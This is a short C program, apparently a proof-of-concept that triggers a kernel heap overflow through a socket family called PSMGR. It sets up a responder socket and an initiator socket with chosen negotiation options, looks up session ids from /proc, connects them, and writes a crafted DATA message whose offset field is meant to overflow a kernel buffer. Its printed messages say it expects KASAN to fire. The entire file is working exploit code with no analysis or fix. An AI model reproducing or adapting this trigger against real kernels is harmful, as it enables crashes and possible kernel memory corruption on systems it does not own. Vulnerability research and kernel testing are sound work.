#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>

#define AF_PSMGR 46
#define PSMGR_SOL 282
#define PSMGR_OPT_SET_ROLE 1
#define PSMGR_OPT_NEGO_1 2
#define PSMGR_OPT_NEGO_2 3
#define PSMGR_ROLE_INITIATOR 0x02
#define PSMGR_ROLE_RESPONDER 0x03
#define PSMGR_XFRM_WINDOW 0x02
#define PSMGR_MODE_INTERLEAVE 0x02
#define PSMGR_MSG_DATA 0x05
#define PSMGR_CLASS_EXTENDED 0x02

struct sockaddr_psmgr { uint16_t family; uint16_t pad; uint32_t id; };
struct psmgr_nego_1 { uint8_t enc_class; uint8_t xfrm_type; uint16_t reserved; };
struct psmgr_nego_2 { uint16_t reserved2; uint8_t enc_mode; uint8_t reserved; uint32_t proc_param; };

uint32_t get_sid(const char *role_filter) {
    FILE *f = fopen("/proc/net/psmgr_table", "r");
    char line[256]; uint32_t latest = 0;
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        uint32_t sid; char rs[32];
        if (sscanf(line, "%u %s", &sid, rs) == 2 && sid > 0)
            if (!role_filter || strstr(rs, role_filter))
                if (sid > latest) latest = sid;
    }
    fclose(f); return latest;
}

int main(void) {
    int fd_r, fd_i;
    struct sockaddr_psmgr addr;
    struct psmgr_nego_1 n1;
    struct psmgr_nego_2 n2;
    uint8_t role, buf[24];
    ssize_t ret;
    uint32_t responder_id, initiator_id;

    printf("step1: responder\n"); fflush(stdout);
    fd_r = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd_r < 0) { perror("socket_r"); return 1; }

    role = PSMGR_ROLE_RESPONDER;
    if (setsockopt(fd_r, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) { perror("role_r"); return 1; }

    memset(&n2, 0, sizeof(n2));
    n2.enc_mode = PSMGR_MODE_INTERLEAVE;
    n2.proc_param = 64;
    if (setsockopt(fd_r, PSMGR_SOL, PSMGR_OPT_NEGO_2, &n2, sizeof(n2)) < 0) { perror("nego2"); return 1; }

    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR;
    addr.id = 0;
    if (bind(fd_r, (struct sockaddr*)&addr, sizeof(addr)) < 0) { perror("bind_r"); return 1; }

    responder_id = get_sid("RESPONDER");
    printf("responder_id=%u\n", responder_id); fflush(stdout);
    if (!responder_id) { printf("no responder id\n"); return 1; }

    printf("step2: initiator\n"); fflush(stdout);
    fd_i = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd_i < 0) { perror("socket_i"); return 1; }

    role = PSMGR_ROLE_INITIATOR;
    if (setsockopt(fd_i, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) { perror("role_i"); return 1; }

    memset(&n1, 0, sizeof(n1));
    n1.enc_class = PSMGR_CLASS_EXTENDED;
    n1.xfrm_type = PSMGR_XFRM_WINDOW;
    if (setsockopt(fd_i, PSMGR_SOL, PSMGR_OPT_NEGO_1, &n1, sizeof(n1)) < 0) { perror("nego1"); return 1; }

    memset(&addr, 0, sizeof(addr));
    addr.family = AF_PSMGR;
    addr.id = responder_id;
    if (connect(fd_i, (struct sockaddr*)&addr, sizeof(addr)) < 0) { perror("connect"); return 1; }
    printf("connected! ESTABLISHED\n"); fflush(stdout);

    initiator_id = get_sid("INITIATOR");
    printf("initiator_id=%u\n", initiator_id); fflush(stdout);

    printf("step3: DATA msg out_offset=128 overflow\n"); fflush(stdout);
    memset(buf, 0, sizeof(buf));
    buf[0] = PSMGR_MSG_DATA;
    buf[1] = initiator_id & 0xff;
    buf[2] = 16; buf[3] = 0;
    buf[4] = 0; buf[5] = 0; buf[6] = 0; buf[7] = 0;
    memset(buf + 8, 0x41, 16);

    ret = write(fd_i, buf, sizeof(buf));
    if (ret < 0) { perror("write"); return 1; }
    printf("write ok ret=%zd KASAN should fire!\n", ret); fflush(stdout);
    close(fd_i); close(fd_r);
    return 0;
}

